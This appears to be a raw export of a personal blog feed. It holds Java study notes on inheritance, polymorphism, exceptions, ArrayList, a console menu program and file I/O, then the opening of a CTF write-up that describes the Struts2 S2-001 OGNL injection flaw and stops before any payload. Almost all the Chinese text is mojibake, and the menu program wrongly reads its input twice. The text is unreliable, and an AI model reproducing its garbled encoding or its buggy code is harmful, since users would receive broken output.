class="line"></span><br></pre></td></tr></table></figure><p>å¥½å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.æé«˜ ä»£ç çš„å¤ç”¨æ€§</span><br><span class="line"></span><br><span class="line">2.ä¾¿äºä»£ç çš„æ‰©å±•</span><br><span class="line"></span><br><span class="line">3.ä¸ºäº†å¤šæ€çš„ä½¿ç”¨</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•çš„é‡å†™</strong></p><p>å‘ç”Ÿåœ¨å­ç±»å’Œçˆ¶ç±»ï¼Œå½“å­ç±»å¯¹çˆ¶ç±»çš„æä¾›çš„æ–¹æ³•ä¸æ»¡æ„çš„æ—¶å€™ï¼Œè¦å¯¹çˆ¶ç±»æ–¹æ³•è¿›è¡Œé‡å†™</p><p><strong>æ ¼å¼è¦æ±‚</strong></p><p>å­ç±»çš„æ–¹æ³•åå­—å’Œçˆ¶ç±»å¿…é¡»ä¸€ç›´ï¼Œå‚æ•°åˆ—è¡¨ï¼ˆä¸ªæ•°ï¼Œç±»å‹ï¼Œé¡ºåºï¼‰</p><p><strong>ä¸é‡è½½çš„åŒºåˆ«</strong></p><p>é‡è½½ï¼šåœ¨åŒä¸€ä¸ªç±»ä¸­ï¼Œå½“æ–¹æ³•åç›¸åŒï¼Œå½¢å‚åˆ—è¡¨ä¸åŒçš„æ—¶å€™ï¼Œå¤šä¸ªæ–¹æ³•æ„æˆé‡è½½</p><p>é‡å†™ï¼šä¸åŒç±»ä¸­ï¼Œå­ç±»å¯¹çˆ¶ç±»çš„æä¾›æ–¹æ³•ä¸æ»¡æ„ï¼Œå¯å¯¹çˆ¶ç±»è¿›è¡Œé‡å†™</p><h2 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h2><p><strong>æ¦‚å¿µ</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¤šç§çŠ¶æ€ï¼Œå…·ä½“ä¸€ç‚¹åŸºäºæ˜¯å»å®ŒæˆæŸä¸ªè¡Œä¸ºï¼Œå½“ä¸åŒå¯¹è±¡å»å®Œæˆæ—¶ä¼šäº§ç”Ÿå‡ºä¸åŒçš„çŠ¶æ€ã€‚åŒæ„è¡Œä¸ºï¼Œä¸åŒçš„å­ç±»å‘ˆç°çš„çŠ¶æ€ä¸åŒ</span><br><span class="line">ps:å¤šæ€ä¸å±æ€§æ— å…³ï¼Œå¤šæ€æŒ‡çš„æ–¹æ³•çš„å¤šæ€ï¼Œè€Œä¸æ˜¯å±æ€§</span><br></pre></td></tr></table></figure><p>å¤šæ€çš„ä¸‰è¦ç´ ï¼šç»§æ‰¿ï¼Œé‡å†™ï¼Œçˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡</p><p>å¤šæ€çš„å¥½å¤„ï¼šæé«˜ä»£ç çš„æ‰©å±•æ€§</p><h2 id="å¼‚å¸¸çš„å¤„ç†"><a href="#å¼‚å¸¸çš„å¤„ç†" class="headerlink" title="å¼‚å¸¸çš„å¤„ç†"></a>å¼‚å¸¸çš„å¤„ç†</h2><p>å¼‚å¸¸å°±æ˜¯åœ¨ç¨‹åºä¸­çš„è¿è¡Œè¿‡ç¨‹ä¸­æ‰€å‘ç”Ÿçš„ä¸æ­£å¸¸çš„æ—¶é—´ï¼Œä»–ä¼šä¸­æ–­æ­£åœ¨è¿è¡Œçš„ç¨‹åº</p><p>æ‰€éœ€æ–‡ä»¶æ‰¾ä¸åˆ°<br>ç½‘ç»œè¿æ¥ä¸é€šæˆ–ä¸­æ–­<br>ç®—æœ¯è¿ç®—é”™ (è¢«é›¶é™¤..)<br>æ•°ç»„ä¸‹æ ‡è¶Šç•Œ<br>è£…è½½ä¸€ä¸ªä¸å­˜åœ¨çš„ç±»æˆ–è€…å¯¹nullå¯¹è±¡æ“ä½œ<br>ç±»å‹è½¬æ¢å¼‚å¸¸</p><p>Javaæä¾›å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚å®ƒå°†å¼‚å¸¸å¤„ç†ä»£ç å’Œå’Œä¸šåŠ¡ä»£ç åˆ†ç¦»ï¼Œä½¿ç¨‹åºæ›´ä¼˜é›…ï¼Œæ›´å¥½çš„<br>å®¹é”™æ€§ï¼Œé«˜é”®å£®æ€§ã€‚<br>Javaçš„å¼‚å¸¸å¤„ç†æ˜¯é€šè¿‡5ä¸ªå…³é”®å­—æ¥å®ç°çš„ï¼š<strong>tryã€catchã€finallyã€throwã€throws</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try-catchæ‰§è¡Œæƒ…å†µ</span><br><span class="line">æƒ…å†µ1ï¼štryå—ä¸­ä»£ç æ²¡æœ‰å‡ºç°å¼‚å¸¸</span><br><span class="line">ä¸æ‰§è¡Œcatchå—ä»£ç ï¼Œæ‰§è¡Œcatchå—åè¾¹çš„ä»£ç </span><br><span class="line">æƒ…å†µ2ï¼štryå—ä¸­ä»£ç å‡ºç°å¼‚å¸¸ï¼Œcatchä¸­å¼‚å¸¸ç±»å‹åŒ¹é…ï¼ˆç›¸åŒæˆ–è€…çˆ¶ç±»ï¼‰</span><br><span class="line">Javaä¼šç”Ÿæˆç›¸åº”çš„å¼‚å¸¸å¯¹è±¡ï¼ŒJavaç³»ç»Ÿå¯»æ‰¾åŒ¹é…çš„catchå—ï¼Œæ‰§è¡Œcatchå—ä»£ç ï¼Œæ‰§è¡Œ</span><br><span class="line">catchå—åè¾¹çš„ä»£ç ã€‚tryå—ä¸­å°šæœªæ‰§è¡Œçš„è¯­å¥ä¸ä¼šæ‰§è¡Œã€‚</span><br><span class="line">æƒ…å†µ3ï¼štryå—ä¸­ä»£ç å‡ºç°å¼‚å¸¸ï¼Œcatchä¸­å¼‚å¸¸ç±»å‹ä¸åŒ¹é…</span><br><span class="line">ä¸æ‰§è¡Œcatchå—ä»£ç ï¼Œä¸æ‰§è¡Œcatchå—åè¾¹çš„ä»£ç ï¼Œç¨‹åºä¼šä¸­æ–­è¿è¡Œ</span><br><span class="line">catchå—ä¸­å¦‚ä½•å¤„ç†å¼‚å¸¸</span><br><span class="line">å…¶ä¸­ä¸€ç§æ–¹å¼ï¼šè‡ªå®šä¹‰å†…å®¹è¾“å‡º</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//ä¸¤ä¸ªæ•°æ±‚å•†</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">int</span> num1=<span class="number">12</span>;</span><br><span class="line">            <span class="type">int</span> num2=<span class="number">0</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;ä¸¤ä¸ªæ•°çš„å•†&quot;</span>+num1/num2);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å¯¹ä¸èµ·ï¼Œç¨‹åºæœ‰é—®é¢˜&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#å¯¹ä¸èµ·ï¼Œç¨‹åºæœ‰é—®é¢˜</span><br></pre></td></tr></table></figure><p>throwå’Œthrowsçš„åŒºåˆ«ï¼š<br>ï¼ˆ1ï¼‰ä½ç½®ä¸åŒï¼š<br>throwï¼šæ–¹æ³•å†…éƒ¨<br>throwsï¼šæ–¹æ³•çš„ç­¾åå¤„ï¼Œæ–¹æ³•çš„å£°æ˜å¤„<br>ï¼ˆ2ï¼‰å†…å®¹ä¸åŒï¼š<br>throw+å¼‚å¸¸å¯¹è±¡D<br>throws+å¼‚å¸¸çš„ç±»å‹<br>ï¼ˆ3ï¼‰ä½œç”¨ä¸åŒï¼š<br>throwï¼šå¼‚å¸¸å‡ºç°çš„æºå¤´ï¼Œåˆ¶é€ å¼‚å¸¸ã€‚<br>throwsï¼šåœ¨æ–¹æ³•çš„å£°æ˜å¤„ï¼Œå‘Šè¯‰æ–¹æ³•çš„è°ƒç”¨è€…ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­å¯èƒ½ä¼šå‡ºç°æˆ‘å£°æ˜çš„è¿™äº›å¼‚<br>å¸¸ã€‚ç„¶åè°ƒç”¨è€…å¯¹è¿™ä¸ªå¼‚å¸¸è¿›è¡Œå¤„ç†ï¼šè¦ä¹ˆè‡ªå·±å¤„ç†è¦ä¹ˆå†ç»§ç»­å‘å¤–æŠ›å‡ºå¼‚å¸¸ã€‚</p><h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><p>æ•°ç»„çš„ç¼ºç‚¹ â€“.&gt; é›†åˆçš„ä¼˜ç‚¹</p><p>ï¼ˆ1ï¼‰æ•°ç»„ä¸€æ—¦æŒ‡å®šäº†é•¿åº¦ï¼Œé‚£ä¹ˆé•¿åº¦å°±è¢«ç¡®å®šäº†ï¼Œä¸å¯ä»¥æ›´æ”¹ã€‚<br>ï¼ˆ2ï¼‰åˆ é™¤ï¼Œå¢åŠ å…ƒç´ æ•ˆç‡ä½ã€‚</p><p> ï¼ˆ3ï¼‰æ•°ç»„ä¸­å®é™…å…ƒç´ çš„æ•°é‡æ˜¯æ²¡æœ‰åŠæ³•è·å–çš„ï¼Œæ²¡æœ‰æä¾›å¯¹åº”çš„æ–¹æ³•æˆ–è€…å±æ€§æ¥è·å–</p><p>ï¼ˆ4ï¼‰å¯¹äºæ— åºçš„ï¼Œä¸å¯é‡å¤çš„åœºåˆæ•°ç»„ä¸èƒ½æ»¡è¶³è¦æ±‚ã€‚</p><p>é›†åˆä½“ç³»éå¸¸åºå¤§</p><p>ArrayList()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test07;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.management.resource.internal.inst.SocketOutputStreamRMHooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ArrayList</span>  <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">         list.add(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">         list.add(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">         list.add(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        list.set(<span class="number">0</span>, <span class="string">&quot;D&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        list.get(<span class="number">2</span>);</span><br><span class="line">        System.out.println(list.get(<span class="number">2</span>));</span><br><span class="line">        list.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//[A, B, C]</span></span><br><span class="line"><span class="comment">//[D, B, C]</span></span><br><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="comment">//[D, B]</span></span><br></pre></td></tr></table></figure><p>ç®€å•å†™ä¸ªå°é¡¹ç›®</p><p>å†™ä¸ªå°èœå•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ã€é€‰æ‹©ä½ çš„å¿ƒä»ªå¯¹è±¡ã€‘</span></span><br><span class="line">  <span class="comment">// å±•ç¤ºå¥³å˜‰å®¾</span></span><br><span class="line">  <span class="comment">// ä¸Šåœºå¥³å˜‰å®¾</span></span><br><span class="line">  <span class="comment">// ä¸‹åœºå¥³å˜‰å®¾</span></span><br><span class="line">  <span class="comment">// é€€å‡º</span></span><br><span class="line"><span class="comment">//å¥³å˜‰å®¾ç¼–å· å¥³å˜‰å®¾åå­— å¥³å˜‰å®¾å¹´é¾„</span></span><br><span class="line"><span class="comment">//  1           wws        18</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//æ‰“å°èœå•</span></span><br><span class="line">        ArrayList list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();<span class="comment">//ç©ºé›†åˆ æ³¨æ„ä½œç”¨èŒƒå›´ï¼Œ</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯·é€‰æ‹©ä½ è¦çš„æ“ä½œ&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----1.å±•ç¤ºå¥³å˜‰å®¾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----2.ä¸Šåœºå¥³å˜‰å®¾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----3.ä¸‹åœºå¥³å˜‰å®¾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----4.é€€å‡ºæœ¬é¡¹ç›®-----&quot;</span>);</span><br><span class="line">            <span class="comment">//å€ŸåŠ©Scanner ç±»</span></span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            <span class="comment">//åˆ©ç”¨é”®ç›˜å½•å…¥åºå·ï¼š</span></span><br><span class="line">            System.out.println(<span class="string">&quot;è¯·è¾“å…¥è¦æ‰§è¡ŒåŠŸèƒ½çš„åºå·:&quot;</span>);</span><br><span class="line">            sc.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">choice</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="comment">//æ ¹æ®choice å½•å…¥åŠŸèƒ½åºå·è¿›è¡Œåç»­åˆ¤æ–­</span></span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;1.å±•ç¤ºå¥³å˜‰å®¾&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=list.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                    Girl g=(Girl)(list.get(i));</span><br><span class="line">                    System.out.println(g.getGnum()+<span class="string">&quot;---&quot;</span>+g.getGname()+<span class="string">&quot;---&quot;</span>+g.getGage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;2.ä¸Šåœºå¥³å˜‰å®¾&quot;</span>);</span><br><span class="line">                <span class="comment">//ä»é”®ç›˜å½•å…¥å¥³å˜‰å®¾ç¼–å·</span></span><br><span class="line">                System.out.println(<span class="string">&quot;è¯·ä¸ºå¥³å˜‰å®¾è¾“å…¥ç¼–å·&quot;</span>);</span><br><span class="line">                <span class="type">int</span> gnum;</span><br><span class="line">                gnum = sc.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;è¯·è¾“å…¥å¥³å˜‰å®¾çš„åå­—&quot;</span>);</span><br><span class="line">                 String gname=sc.next();</span><br><span class="line">                System.out.println(<span class="string">&quot;è¯·è¾“å…¥å¥³å˜‰å®¾çš„å¹´é¾„&quot;</span>);</span><br><span class="line">                <span class="type">int</span> gage=sc.nextInt();</span><br><span class="line">                Girl g=<span class="keyword">new</span> <span class="title class_">Girl</span>(gnum,gname,gage);</span><br><span class="line">                g.setGnum(gnum);</span><br><span class="line">                g.setGname(gname);</span><br><span class="line">                g.setGage(gage);</span><br><span class="line">                <span class="comment">//åˆ›å»ºä¸€ä¸ªé›†åˆï¼Œç”¨äºå­˜æ”¾ä¸€ä¸ªç›¸åŒä¸ªä½“</span></span><br><span class="line"></span><br><span class="line">                list.add(g);<span class="comment">//æ·»åŠ å¥³å˜‰å®¾</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">3</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;3.ä¸‹åœºå¥³å˜‰å®¾&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">delNo</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//ä¸‹åœºå¯¹åº”çš„å¥³å˜‰å®¾</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=list.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                    Girl g=(Girl)list.get(i);</span><br><span class="line">                    <span class="keyword">if</span>(g.getGnum()==delNo)&#123;</span><br><span class="line">                        list.remove(g);</span><br><span class="line">                        System.out.println(<span class="string">&quot;å¯æƒœä¸æ˜¯ä½ ï¼Œé™ªæˆ‘åˆ°æœ€å~~~&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;<span class="comment">//æˆåŠŸ åœæ­¢éå†</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;4.é€€å‡º&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Gu0f3n.java.test05.Gire;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Girl</span> &#123;<span class="comment">//å¥³å˜‰å®¾</span></span><br><span class="line">    <span class="comment">//å±æ€§</span></span><br><span class="line">    <span class="comment">//å¥³å˜‰å®¾ç¼–å·</span></span><br><span class="line">    <span class="comment">//åå­—</span></span><br><span class="line">    <span class="comment">//å¹´é¾„</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> gnum;</span><br><span class="line">    <span class="keyword">private</span> String gname;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> gage;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGname</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGname</span><span class="params">(String gname)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gname = gname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGnum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gnum;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGnum</span><span class="params">(<span class="type">int</span> gnum)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gnum = gnum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGage</span><span class="params">(<span class="type">int</span> gage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gage = gage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ„é€ å™¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Girl</span><span class="params">(<span class="type">int</span> gnum, String gname, <span class="type">int</span> gage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gnum = gnum;</span><br><span class="line">        <span class="built_in">this</span>.gname = gname;</span><br><span class="line">        <span class="built_in">this</span>.gage = gage;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸Šé¢åŸºæœ¬ä¸Šè¦†ç›–äº†ä¹‹å‰å­¦è¿‡çš„æ‰€æœ‰å†…å®¹</p><h2 id="I-Oæµ"><a href="#I-Oæµ" class="headerlink" title="I&#x2F;Oæµ"></a>I&#x2F;Oæµ</h2><p>File ç±»ä½œç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fileç±»å¯¹è±¡å¯å°è£…è¦æ“ä½œçš„æ–‡ä»¶ï¼Œå¯é€šè¿‡Fileç±»çš„å¯¹è±¡å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œå¦‚æŸ¥çœ‹æ–‡</span><br><span class="line">ä»¶çš„å¤§å°ã€åˆ¤æ–­æ–‡ä»¶æ˜¯å¦éšè—ã€åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯è¯»ç­‰ã€‚</span><br><span class="line">å±€é™ï¼šFileç±»çš„ç›¸å…³æ“ä½œï¼Œå¹¶ä¸æ¶‰åŠæ–‡ä»¶å†…å®¹ç›¸å…³çš„æ“ä½œï¼Œè¿™æ˜¯å•ç‹¬ä¾é Fileç±»å¯¹</span><br><span class="line">è±¡æ— æ³•å®ç°çš„æ“ä½œï¼Œæ­¤æ—¶éœ€è¦å€ŸåŠ©I/Oæµå®Œæˆã€‚</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731325027010.png"></p><p>I&#x2F;O input&#x2F;output</p><p>åˆ†ç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°†I/Oæµç†è§£ä¸ºâ€œç®¡å­â€ï¼Œé‚£ä¹ˆç”Ÿæ´»ä¸­â€œç®¡å­&quot;æ€ä¹ˆåˆ†ç±»çš„å‘¢ï¼Ÿåˆ†ç±»æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºã€‚</span><br><span class="line">æ–¹å¼1ï¼šæŒ‰ç…§æ–¹å‘åˆ’åˆ†ã€‚</span><br><span class="line">è¾“å…¥æµã€è¾“å‡ºæµã€‚</span><br><span class="line">æ–¹å¼2ï¼šæŒ‰ç…§å¤„ç†å•å…ƒåˆ’åˆ†ã€‚</span><br><span class="line">å­—èŠ‚æµã€å­—ç¬¦æµã€‚</span><br><span class="line">æ–¹å¼3ï¼šæŒ‰ç…§åŠŸèƒ½åˆ’åˆ†ã€‚</span><br><span class="line">èŠ‚ç‚¹æµã€å¤„ç†æµ</span><br></pre></td></tr></table></figure><p>i&#x2F;oæµä½“ç³»</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731325333620.png"></p><p>ç»ƒä¹ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test09;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œå°†æ–‡ä»¶å°è£…ä¸ºfile å¯¹è±¡</span></span><br><span class="line">        File f= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\CTF\\Audacity\\java project\\java study\\src\\Gu0f3n\\java\\test.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//è¾“å…¥å­—ç¬¦æµ</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(f);</span><br><span class="line">        <span class="comment">//å¼€å§‹</span></span><br><span class="line"><span class="comment">//        int n1 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n1);</span></span><br><span class="line"><span class="comment">//        int n2 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n2);</span></span><br><span class="line"><span class="comment">//        int n3 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n3);</span></span><br><span class="line"><span class="comment">//        int n4 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n4);</span></span><br><span class="line"><span class="comment">//        int n5 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n5);</span></span><br><span class="line"><span class="comment">//        int n6 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n6);</span></span><br><span class="line"><span class="comment">//        int n7 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n7);</span></span><br><span class="line"><span class="comment">//        int n8 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n8);</span></span><br><span class="line">        <span class="type">int</span> n=fr.read();</span><br><span class="line">        <span class="keyword">while</span>(n!=-<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">            n=fr.read();</span><br><span class="line">        &#125;</span><br><span class="line">        fr.close();<span class="comment">//æµå…³é—­</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java study</title>
      <link href="/2024/09/04/study/"/>
      <url>/2024/09/04/study/</url>
      
        <content type="html"><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p>ç‚¹è¿›å»å‘ç°ä¸€ä¸ªç™»å½•æ¡†</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_12.png"></p><p>æ²¡æ€è·¯ çœ‹wp</p><p>äº†è§£ä¸‹</p><p>Struts2æ˜¯ç”¨Javaè¯­è¨€ç¼–å†™çš„ä¸€ä¸ªåŸºäºMVCè®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶</p><p>æè¿°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struts2æ¼æ´ S2-001æ˜¯å½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ%&#123;value&#125;å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®ã€‚ä¾‹å¦‚ï¼Œåœ¨æ³¨å†Œæˆ–ç™»å½•é¡µé¢ä¸­ã€‚å¦‚æœæäº¤å¤±è´¥ï¼Œåˆ™æœåŠ¡å™¨é€šå¸¸é»˜è®¤æƒ…å†µä¸‹å°†è¿”å›å…ˆå‰æäº¤çš„æ•°æ®ã€‚ç”±äºæœåŠ¡å™¨ç”¨äº%&#123;value&#125;å¯¹æäº¤çš„æ•°æ®æ‰§è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œå› æ­¤æœåŠ¡å™¨å¯ä»¥ç›´æ¥å‘é€æœ‰æ•ˆè½½è·æ¥æ‰§è¡Œå‘½ä»¤ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæåˆ°äº† OGNL è¡¨è¾¾å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OGNLï¼ˆObject-Graph Navigation Languageï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨Javaåº”ç”¨ç¨‹åºä¸­è®¿é—®å’Œæ“ä½œå¯¹è±¡å›¾çš„è¡¨è¾¾å¼è¯­è¨€ã€‚OGNLæœ€åˆæ˜¯ç”±Drew Davidsonå’ŒLuke 